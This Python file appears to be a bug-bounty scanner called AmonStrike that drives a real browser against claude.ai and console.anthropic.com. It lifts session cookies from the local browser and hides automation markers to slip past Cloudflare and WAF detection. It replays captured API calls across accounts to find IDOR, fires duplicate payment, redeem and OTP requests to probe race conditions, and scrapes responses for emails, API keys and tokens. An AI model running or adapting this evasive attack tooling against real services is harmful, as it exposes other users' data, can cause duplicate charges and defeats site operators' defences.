#!/usr/bin/env python3
"""
AmonStrike — Browser Execution Engine
Routes ALL tests through the real browser.
Cloudflare sees legitimate browser traffic — not a scanner.

Architecture:
  Playwright controls the real Chrome/Firefox
  Tests execute AS the browser — same CF tokens, same TLS fingerprint
  Scanner is invisible to WAF/Cloudflare
  
This is the key difference between detected and undetected testing.
"""

import re, json, time, hashlib
from pathlib import Path
from datetime import datetime


class BrowserEngine:
    """
    Executes all security tests through real browser.
    Indistinguishable from human browsing to any WAF.
    """

    def __init__(self, headless: bool = True):
        self.headless   = headless
        self.browser    = None
        self.context    = None
        self.page       = None
        self.captured   = []  # all requests seen
        self.findings   = []

    def __enter__(self):
        self._start()
        return self

    def __exit__(self, *args):
        self._stop()

    def _start(self):
        from playwright.sync_api import sync_playwright
        self._pw      = sync_playwright().__enter__()
        self.browser  = self._pw.chromium.launch(
            headless = self.headless,
            args     = [
                "--no-sandbox",
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--ignore-certificate-errors",
            ],
            # Use real Chrome channel if available
            channel = "chrome" if self._chrome_available() else None,
        )
        self.context = self.browser.new_context(
            # Real browser fingerprint
            user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            viewport   = {"width": 1920, "height": 1080},
            locale     = "en-US",
            timezone_id= "Europe/Berlin",
            ignore_https_errors = True,
            # Intercept all network requests
        )
        # Intercept ALL API calls made by the browser
        self.context.route("**/*", self._intercept_request)
        self.page = self.context.new_page()
        # Hide automation indicators
        self.page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
            window.chrome = {runtime: {}};
        """)
        print("  [BROWSER] Real browser started")

    def _chrome_available(self) -> bool:
        import shutil
        return bool(shutil.which("google-chrome") or shutil.which("chromium"))

    def _intercept_request(self, route, request):
        """Intercept every request the browser makes."""
        url = request.url
        # Capture API calls
        if "/api/" in url or "/v1/" in url or "/graphql" in url:
            self.captured.append({
                "url":     url,
                "method":  request.method,
                "headers": dict(request.headers),
                "body":    request.post_data or "",
            })
        route.continue_()

    def load_session(self, domain: str, cookies: dict):
        """Load real browser cookies into context."""
        cookie_list = []
        for name, value in cookies.items():
            cookie_list.append({
                "name":   name,
                "value":  value,
                "domain": f".{domain}",
                "path":   "/",
            })
        self.context.add_cookies(cookie_list)
        print(f"  [BROWSER] {len(cookie_list)} cookies loaded")

    def navigate(self, url: str, wait: str = "networkidle") -> bool:
        """Navigate browser to URL."""
        try:
            self.page.goto(url, wait_until=wait, timeout=20000)
            return True
        except Exception:
            try:
                self.page.goto(url, wait_until="domcontentloaded", timeout=15000)
                return True
            except Exception:
                return False

    def get_api_response(self, url: str, method: str = "GET",
                         body: dict = None) -> dict:
        """
        Execute API call FROM the browser.
        Uses browser's own session cookies and headers.
        Cloudflare sees this as legitimate browser request.
        """
        script = f"""
        async () => {{
            try {{
                const options = {{
                    method: '{method}',
                    headers: {{
                        'Content-Type': 'application/json',
                        'X-HackerOne-Handle': 'jardani101',
                    }},
                    credentials: 'include',
                }};
                {f"options.body = JSON.stringify({json.dumps(body)});" if body else ""}
                const r = await fetch('{url}', options);
                const text = await r.text();
                return {{
                    status: r.status,
                    headers: Object.fromEntries(r.headers.entries()),
                    body: text,
                }};
            }} catch(e) {{
                return {{status: 0, body: e.toString()}};
            }}
        }}
        """
        try:
            result = self.page.evaluate(script)
            return result or {}
        except Exception as e:
            return {"status": 0, "body": str(e)}

    def test_idor_browser(self, url: str, org_id_a: str,
                          org_id_b: str) -> dict:
        """
        Test IDOR by swapping org IDs — executed FROM browser.
        Browser has valid CF clearance — not detectable as scanner.
        """
        # Replace org A's ID with org B's in URL
        test_url = url.replace(org_id_a, org_id_b)
        if test_url == url:
            return {}

        # Execute from browser context
        r = self.get_api_response(test_url)
        if r.get("status") == 200:
            body = r.get("body", "")
            sensitive = self._find_sensitive(body)
            if sensitive:
                return {
                    "confirmed": True,
                    "url":       test_url,
                    "status":    200,
                    "sensitive": sensitive,
                    "evidence":  body[:400],
                    "poc":       f"Fetch from browser: fetch('{test_url}', {{credentials:'include'}})",
                }
        return {"confirmed": False, "status": r.get("status", 0)}

    def map_all_api_calls(self, target: str,
                          pages_to_visit: list = None) -> list:
        """
        Visit all pages of the app as a real user.
        Capture every API call the browser makes.
        Returns complete list of real endpoints.
        """
        if not pages_to_visit:
            from urllib.parse import urlparse
            domain = urlparse(target).netloc
            pages_to_visit = [
                target,
                f"{target}/settings",
                f"{target}/chats",
                f"https://console.anthropic.com",
                f"https://console.anthropic.com/settings",
                f"https://console.anthropic.com/api-keys",
                f"https://console.anthropic.com/usage",
                f"https://console.anthropic.com/team",
                f"https://console.anthropic.com/billing",
            ]

        print(f"  [BROWSER] Visiting {len(pages_to_visit)} pages...")
        before = len(self.captured)

        for url in pages_to_visit:
            print(f"  [BROWSER] → {url}")
            self.navigate(url)
            time.sleep(2)  # Wait for all API calls to complete

        new_calls = self.captured[before:]
        # Deduplicate
        seen = set()
        unique = []
        for call in new_calls:
            key = f"{call['method']}:{call['url']}"
            if key not in seen:
                seen.add(key)
                unique.append(call)

        print(f"  [BROWSER] Captured {len(unique)} unique API calls")
        return unique

    def test_all_captured(self, captured: list,
                          org_id_a: str, org_id_b: str,
                          account2_cookies: dict) -> list:
        """
        Test every captured API call with Account B's session.
        Run entirely from browser — WAF cannot detect this.
        """
        findings = []
        print(f"\n  [BROWSER] Testing {len(captured)} endpoints cross-account...")

        # Switch to Account B's session
        domain = "claude.ai"
        self.context.clear_cookies()
        self.load_session(domain, account2_cookies)
        self.load_session("console.anthropic.com", account2_cookies)
        self.navigate("https://claude.ai")

        for call in captured:
            url    = call["url"]
            method = call["method"]

            # Replace Account A's org ID with Account A's org ID in URL
            # (we are logged in as Account B, so accessing A's data = IDOR)
            if org_id_a not in url:
                continue

            r = self.get_api_response(url, method)
            status = r.get("status", 0)

            if status == 200:
                body      = r.get("body", "")
                sensitive = self._find_sensitive(body)
                if sensitive:
                    findings.append({
                        "title":     f"IDOR — Account B accesses Account A data: {url}",
                        "severity":  "CRITICAL",
                        "url":       url,
                        "evidence":  f"Status 200\nSensitive: {sensitive}\nData: {body[:300]}",
                        "poc":       (
                            f"// Run in browser console while logged in as Account B:\n"
                            f"fetch('{url}', {{credentials:'include'}})"
                            f".then(r=>r.json()).then(console.log)"
                        ),
                        "impact":    "Account B can read Account A private data",
                        "proven":    True,
                    })
                    print(f"  [!!!] IDOR CONFIRMED: {url}")
                    print(f"        Sensitive: {sensitive}")
            else:
                print(f"  [{status}] {url[:60]}")

        return findings

    def idempotency_test(self, endpoint: str, body: dict,
                         method: str = "POST") -> dict:
        """
        Test for missing idempotency protection.
        
        Send same request twice:
        - With same Idempotency-Key → server should reject second
        - Without key → both succeed = race condition possible
        
        Applies to: payments, coupons, votes, OTP, account creation
        """
        idem_key = hashlib.md5(
            f"{endpoint}{json.dumps(body)}".encode()
        ).hexdigest()

        # Add idempotency key headers (various formats)
        idem_headers = {
            "Idempotency-Key":      idem_key,
            "X-Idempotency-Key":    idem_key,
            "X-Request-Id":         idem_key,
            "X-Idempotent-Replayed":"true",
        }

        results = []
        for i in range(2):
            script = f"""
            async () => {{
                const r = await fetch('{endpoint}', {{
                    method: '{method}',
                    headers: {{
                        'Content-Type': 'application/json',
                        'Idempotency-Key': '{idem_key}',
                        'X-Idempotency-Key': '{idem_key}',
                        'X-Request-Id': '{idem_key}',
                        'X-HackerOne-Handle': 'jardani101',
                    }},
                    body: JSON.stringify({json.dumps(body)}),
                    credentials: 'include',
                }});
                return {{status: r.status, body: await r.text()}};
            }}
            """
            try:
                result = self.page.evaluate(script)
                results.append(result)
                time.sleep(0.1)
            except Exception as e:
                results.append({"status": 0, "error": str(e)})

        if len(results) == 2:
            r1, r2 = results
            # Both succeeded = missing idempotency = race condition possible
            if r1.get("status") in [200,201] and r2.get("status") in [200,201]:
                return {
                    "vulnerable": True,
                    "type":       "missing_idempotency",
                    "severity":   "HIGH",
                    "evidence":   f"Request 1: {r1['status']}\nRequest 2: {r2['status']}\nBoth succeeded with same Idempotency-Key",
                    "poc":        f"Send POST to {endpoint} twice with same Idempotency-Key",
                    "impact":     "Race condition possible — duplicate processing, double charges, OTP bypass",
                }
            # Second rejected = properly protected
            if r1.get("status") in [200,201] and r2.get("status") == 409:
                return {
                    "vulnerable": False,
                    "type":       "idempotency_enforced",
                }

        return {"vulnerable": False, "error": "inconclusive"}

    def scan_for_idempotency_issues(self, target: str) -> list:
        """
        Find all state-changing endpoints and test each for
        missing idempotency protection.
        """
        findings  = []
        state_eps = [
            ep for ep in self.captured
            if ep["method"] in ["POST","PUT","PATCH","DELETE"]
            and any(k in ep["url"] for k in [
                "redeem","transfer","pay","vote","like","order",
                "verify","confirm","apply","submit","create",
                "invite","revoke","reset","send",
            ])
        ]

        print(f"\n  [IDEM] Testing {len(state_eps)} state-changing endpoints...")
        for ep in state_eps[:20]:
            try:
                body = json.loads(ep.get("body","{}")) if ep.get("body") else {}
            except Exception:
                body = {}

            result = self.idempotency_test(ep["url"], body, ep["method"])
            if result.get("vulnerable"):
                findings.append({
                    "title":    f"Missing Idempotency — Race Condition: {ep['url']}",
                    "severity": "HIGH",
                    "url":      ep["url"],
                    "evidence": result["evidence"],
                    "poc":      result["poc"],
                    "impact":   result["impact"],
                    "proven":   True,
                })
                print(f"  [!!!] IDEMPOTENCY MISSING: {ep['url']}")

        return findings

    def _find_sensitive(self, text: str) -> list:
        found = []
        for field, pat in {
            "email":   r'"(?:email|email_address)"\s*:\s*"[^"@]+@[^"]+"',
            "name":    r'"(?:full_name|display_name)"\s*:\s*"[^"]{2,}"',
            "api_key": r'"(?:key|api_key)"\s*:\s*"sk-[^"]+"',
            "uuid":    r'"uuid"\s*:\s*"[a-f0-9-]{30,}"',
            "token":   r'"token"\s*:\s*"[^"]{20,}"',
            "org":     r'"organization"\s*:\s*\{',
        }.items():
            import re
            if re.search(pat, text, re.I):
                found.append(field)
        return found

    def screenshot(self, name: str) -> str:
        path = f"output/screenshots/{name}_{int(time.time())}.png"
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        self.page.screenshot(path=path, full_page=True)
        return path

    def _stop(self):
        try:
            if self.browser:
                self.browser.close()
            if hasattr(self, '_pw'):
                self._pw.__exit__(None, None, None)
        except Exception:
            pass


class BrowserPentest:
    """
    Full pentest engine using browser as execution layer.
    Invisible to WAF and Cloudflare.
    """

    def __init__(self, target: str, program: str = ""):
        self.target     = target
        self.program    = program
        self.output_dir = Path(f"output/{target.replace('https://','').split('/')[0]}")
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def run(self, org_id_a: str = "", org_id_b: str = "",
            cookies_a: dict = None, cookies_b: dict = None) -> dict:

        print(f"\n{'='*60}")
        print(f"  BROWSER PENTEST ENGINE")
        print(f"  Target: {self.target}")
        print(f"  WAF bypass: browser execution layer")
        print(f"{'='*60}\n")

        all_findings = []

        with BrowserEngine(headless=True) as browser:

            # Step 1: Load Account A session
            if cookies_a:
                browser.load_session("claude.ai", cookies_a)
                browser.load_session("console.anthropic.com", cookies_a)

            # Step 2: Map ALL real API calls by browsing
            print("[Step 1] Mapping real API surface by browsing...")
            captured = browser.map_all_api_calls(self.target)

            # Step 3: Test idempotency on all state-changing endpoints
            print("\n[Step 2] Testing idempotency on all POST/PUT endpoints...")
            idem_findings = browser.scan_for_idempotency_issues(self.target)
            all_findings.extend(idem_findings)

            # Step 4: Cross-account IDOR with Account B
            if cookies_b and org_id_a and org_id_b:
                print("\n[Step 3] Cross-account IDOR testing...")
                idor_findings = browser.test_all_captured(
                    captured, org_id_a, org_id_b, cookies_b
                )
                all_findings.extend(idor_findings)

            # Step 5: Screenshot any findings
            for f in all_findings[:3]:
                if browser.navigate(f["url"]):
                    f["screenshot"] = browser.screenshot(
                        hashlib.md5(f["url"].encode()).hexdigest()[:8]
                    )

        # Report
        print(f"\n{'='*60}")
        print(f"  BROWSER PENTEST COMPLETE")
        print(f"  Findings: {len(all_findings)}")
        for f in all_findings:
            print(f"  [{f['severity']}] {f['title'][:60]}")

        if all_findings:
            try:
                from reports.hackerone_format import generate_h1_package
                pkg = generate_h1_package(
                    all_findings, str(self.output_dir),
                    program_handle=self.program,
                    target_url=self.target,
                )
                if pkg.get("portal"):
                    print(f"\n  H1 Portal: {pkg['portal']}")
            except Exception:
                pass

        return {"findings": all_findings, "captured": len(captured)}


if __name__ == "__main__":
    import sys
    sys.path.insert(0, ".")

    from core.session_manager import SessionManager
    sm = SessionManager()
    c1 = sm._grab_from_browser("claude.ai")
    c2 = sm._grab_from_browser("console.anthropic.com")

    if not c1:
        print("[!] Login to claude.ai in Firefox first")
        sys.exit(1)

    # Get org IDs
    import requests, urllib3, re
    urllib3.disable_warnings()
    s = requests.Session()
    s.verify = False
    s.cookies.update(c1)
    r = s.get("https://claude.ai/api/bootstrap", timeout=10)
    org_a = org_b = ""
    if r.status_code == 200:
        d = r.json()
        m = d.get("account", {}).get("memberships", [])
        if m:
            org_a = m[0].get("organization", {}).get("uuid", "")

    engine = BrowserPentest("https://claude.ai", "anthropic")
    engine.run(
        org_id_a  = org_a,
        org_id_b  = org_b,
        cookies_a = c1,
        cookies_b = c2,
    )
